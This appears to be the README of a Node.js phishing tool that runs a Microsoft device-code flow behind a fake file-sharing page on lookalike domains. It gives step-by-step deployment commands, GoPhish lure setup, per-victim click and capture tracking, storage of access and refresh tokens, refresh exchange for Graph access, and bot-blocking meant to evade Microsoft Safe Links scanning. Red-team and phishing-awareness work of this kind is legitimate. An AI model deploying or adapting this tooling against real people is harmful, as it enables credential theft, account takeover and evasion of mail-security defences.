# Token Phisher

## Description
This NodeJS app listens for users accessing the website. In the background a Device Code Flow is started and the User Code presented to the user. Once the user finished the flow, the tokens are stored to a file. This default example is configured to imitate a file sharing process.

## Requirements
Node.js 18+

## Quick start

```bash
npm install
npm run setup -- --help
```

### Production (Let's Encrypt — recommended for deep subdomains)

Use this for hostnames like `gipi.sharepoint.com.documents.v06.zip`. Token needs **Zone → DNS → Edit** and **Zone → Read**:

```bash
export CLOUDFLARE_API_TOKEN=your_token_here

npm run setup -- \
  --domain gipi.sharepoint.com.documents.v06.zip \
  --tenant gipi.com \
  --tls letsencrypt
```

In Cloudflare DNS, set your **A record to grey cloud (DNS only)** — not proxied. Browsers connect directly to your server and trust the Let's Encrypt cert. Certs are stored in `/var/lib/tokenphisher/certs/` and renew with:

```bash
npm run renew -- --cf-token YOUR_TOKEN
```

Add a monthly cron to renew before the 90-day expiry.

### Production (Cloudflare Origin cert — shallow subdomains + proxy)

For `share.example.com` with **orange cloud (proxied)** DNS. Token needs **Origin CA Edit** + **SSL/Certificates Edit**:

```bash
npm run setup -- \
  --domain share.example.com \
  --tenant contoso.com \
  --tls cloudflare-origin
```

Set Cloudflare SSL/TLS mode to **Full (strict)**. Free edge SSL only covers one subdomain level — deeper names need Let's Encrypt (grey cloud) or paid Total TLS.

Setup will:
1. Fetch Microsoft OAuth URLs from OpenID discovery
2. Issue TLS certs (Let's Encrypt or Cloudflare Origin depending on `--tls`)
3. Write `config.json` and update `server.js`

**Redeploying** — reuse existing certs without a token if still valid:

```bash
git pull && npm install
npm run setup -- --domain gipi.sharepoint.com.documents.v06.zip --tenant gipi.com
```

Start the server:

```bash
sudo npm start   # ports 80/443 require elevated privileges on Linux
```

### Local testing (no TLS)

```bash
npm run setup -- --test-mode --tenant contoso.com
npm start
```

The app listens on HTTP port 80 (or change `httpPort` in config).

## Running

```bash
npm start
# or
node server.js
```

Configuration is loaded from `config.json` when present. If missing, `server.js` falls back to its embedded `defaultConfig`.

Re-run `npm run setup` any time to change settings or re-provision certificates. Setup always rewrites `config.json` and syncs `server.js`.

## Manual configuration

Copy the example and edit by hand if you prefer:

```bash
cp config.example.json config.json
```

Or edit `defaultConfig` in `server.js` directly, then run:

```bash
npm run setup -- --config-only --from-config config.json
```

### Configuration reference

| Key | Description |
|-----|-------------|
| `httpPort` | HTTP port (test mode only) |
| `httpsPort` | HTTPS port |
| `testMode` | `true` = HTTP only, no TLS |
| `debug` | Verbose console and log output |
| `clientId` | OAuth client ID — see [MS client ID research](https://github.com/secureworks/family-of-client-ids-research/blob/main/scope-map.txt) |
| `tokenUrl` | Token endpoint (tenant must match `deviceCodeUrl`) |
| `deviceCodeUrl` | Device code flow start URL |
| `scopes` | Space-separated OAuth scopes; include `offline_access` for refresh tokens |
| `phishingHTML` | Template in `views/` shown to victims |
| `redirectUrl` | Redirect for `/` and blocked geo IPs |
| `alreadyLoggedInURL` | Redirect for returning victims (cookie set) |
| `cookieExpirationInDays` | Cookie lifetime |
| `userCodesFile` | Log of phished user codes |
| `logFile` | Application log |
| `tokenFile` | Captured tokens |
| `threemaOn` / `threemaTo` / `threemaFrom` / `threemaURL` / `threemaSecret` | Optional Threema notifications |
| `keyFilePath` / `certFilePath` / `caFilePath` | TLS certificate paths (set automatically by setup) |
| `userAgent` | User-Agent for OAuth requests |
| `geoipallowlist` | ISO country codes allowed to reach `/share` |
| `validateTokens` | After capture, probe Graph API and try refresh exchange (default: `true`) |
| `graphValidationScope` | Scope used when refreshing for Graph validation |
| `printTokensOnCapture` | Log access/refresh/id tokens to console after capture (default: `true`) |
| `visitLogFile` | TSV path for click/capture tracking (default: `visits.tsv`) |
| `botguard.enabled` | Block bots/scanners on `/share` (default: `true`) |
| `botguard.safelinksBlock` | Block Microsoft Safe Links detonation (default: `true`) |
| `botguard.jsChallenge` | Require JS cookie challenge before lure (default: `false`) |
| `botguard.blockedJa3` | Block TLS JA3 hashes (requires `X-JA3-Fingerprint` header from edge) |

## Bot protection

Ported from [BenevolentGinx2](https://github.com/patrick-projects/BenevolentGinx2). Applied to **`/share` only** — `/smoke-test` is never filtered.

**Why you want this with GoPhish + M365:** Microsoft Safe Links detonates URLs at mail delivery from datacenter IPs. Without blocking, every sent email creates a fake `issued` row in `visits.tsv` and burns device codes before victims click.

Default behavior (`botguard.enabled: true`, `safelinksBlock: true`, `jsChallenge: false`):

- Hard-block Safe Links / EOP scanner IPs, UAs, and headers → redirect to `redirectUrl`
- Block known scanner UAs (curl, python-requests, headless Chrome, etc.)
- Block empty User-Agent or missing `Accept-Language` / `Accept`

Optional **`jsChallenge: true`** — serve a short “Verifying your browser…” page that sets a cookie before showing the lure. Use if you still see scanner noise; adds one reload for real users.

Blocked requests are logged:

```
Botguard block: microsoft safelinks scanner ip=40.94.x.x
```

## Tracking who clicked and who captured

Each visit to `/share` gets a **unique device code** — victims do not share one code. You learn their Azure identity only **after** they sign in at `microsoft.com/devicelogin`.

Every event is appended to **`visits.tsv`** (tab-separated):

```
timestamp    code       recipient           gophish_rid    ip           status     user              detail
[10.06...]   ABCD1234   alice@gipi.com      abc123xyz      203.0.113.1  issued
[10.06...]   ABCD1234   alice@gipi.com      abc123xyz      203.0.113.1  captured   alice@gipi.com
[10.06...]   WXYZ5678   bob@gipi.com        def456uvw      198.51.100.2 issued
[10.06...]   WXYZ5678   bob@gipi.com        def456uvw      198.51.100.2 expired                      device code timed out before login
```

**Query params:** `?r=` or `?email=` (target email from mail merge), `?rid=` (GoPhish recipient id), `?id=` (generic fallback).

**Status values:** `issued` (opened lure), `captured` (submitted code + got tokens), `expired` (never finished), `login_failed` (Microsoft rejected login).

Quick checks on the server:

```bash
# Everyone who completed login
awk -F'\t' '$6=="captured" {print $3, $7}' visits.tsv

# Opened but never finished
awk -F'\t' '$6=="expired" || $6=="login_failed" {print $3, $6}' visits.tsv
```

### GoPhish setup

Use GoPhish for **email delivery + click tracking**, TokenPhisher for **device-code capture**. Typical flow:

1. **Landing page** in GoPhish → type **Redirect**, URL:
   ```
   https://gipi.sharepoint.com.documents.v06.zip/share?r={{.Email}}
   ```
2. **Email template** → link victims with GoPhish’s tracked URL:
   ```html
   <a href="{{.URL}}">View shared document</a>
   ```
3. Victim clicks → GoPhish logs the click → redirects to TokenPhisher with `?r=alice@gipi.com&rid=...` appended.

TokenPhisher stores both **email** (`recipient`) and **GoPhish rid** (`gophish_rid`) in `visits.tsv`. Correlate with GoPhish campaign results using `rid`, or read email directly from the TSV.

**Alternative (no GoPhish click proxy):** put TokenPhisher directly in the email — you lose GoPhish click events but still track by email:

```html
<a href="https://gipi.sharepoint.com.documents.v06.zip/share?r={{.Email}}">View shared document</a>
```

**What each tool tracks:**

| Event | GoPhish | TokenPhisher (`visits.tsv`) |
|-------|---------|------------------------------|
| Email sent | yes | — |
| Link clicked | yes (`rid`) | `issued` |
| Opened lure / saw code | — | `issued` |
| Completed Microsoft login | — | `captured` + email in `user` |

If you send one bare `/share` URL with no query params, you only learn who **captured** (from the token), not who clicked and bounced.

## Post-capture validation

When a victim completes device login, the console and `logfile.txt` show:

```
Visit /share — code ABCD1234 recipient=alice@gipi.com ip=203.0.113.1
Start polling token for code: ABCD1234
Success, your Azure tokens for code ABCD1234 were saved to tokens.txt
CAPTURE OK — user=alice@gipi.com tenant=3fc8fb8d-... code=ABCD1234 name="Jane Doe"
GRAPH OK — Jane Doe (alice@gipi.com)
```

If the access token cannot call Graph (common with minimal scopes), a refresh exchange is attempted:

```
GRAPH BLOCKED — HTTP 401 with access_token: ...
Trying refresh_token exchange for Graph scope ...
REFRESH OK + GRAPH OK — Jane Doe (victim@gipi.com)
```

Refreshed tokens are saved to `<usercode>.graph-refresh.json`. Outcomes:

| Message | Meaning |
|---------|---------|
| `GRAPH OK` | Access token works against Microsoft Graph |
| `GRAPH BLOCKED` | Token captured but Graph denied with access token |
| `REFRESH OK + GRAPH OK` | FOCI-style refresh unlocked Graph access |
| `REFRESH BLOCKED` | Refresh failed — often CA, consent, or scope policy |

Set `"validateTokens": false` in config to disable.

## Smoke test (real login with your account)

`/smoke-test` works like `/share`, but uses Microsoft **`/common/`** endpoints so you can sign in with **any Azure AD account you control** — production gipi config stays unchanged.

```
https://your-domain/smoke-test
```

Setup and `npm start` print this URL next to the victim URL. Complete login at `microsoft.com/devicelogin` and watch server logs for `CAPTURE` + `GRAPH OK`.

Optional CLI diagnostics (no browser):

```bash
npm run smoke-test
```

### Self-test without the client's tenant

| Endpoint | Use case |
|----------|----------|
| `/smoke-test` (server) | Real login test with `/common/` + your account |
| `common` in CLI | API-only checks |

**Free dev tenant:** [Microsoft 365 Developer Program](https://developer.microsoft.com/microsoft-365/dev-program) gives `*.onmicrosoft.com` test users if you don't have another work account.

## Certificates

| Mode | Best for | Cloudflare DNS | Browser SSL |
|------|----------|----------------|-------------|
| `letsencrypt` (default) | Deep subdomains | Grey cloud (DNS only) | LE cert — trusted everywhere |
| `cloudflare-origin` | Shallow subdomains + hide IP | Orange cloud (proxied) | CF edge cert (free tier: one level only) |

Certs persist at **`/var/lib/tokenphisher/certs/<domain>/`**. Let's Encrypt certs expire every ~90 days — run `npm run renew`.

## Other notes

- Static assets for the phishing page go in `public/assets/`
- User codes expire after 15 minutes; polling stops automatically
- The app logs polling status every minute when debug is off
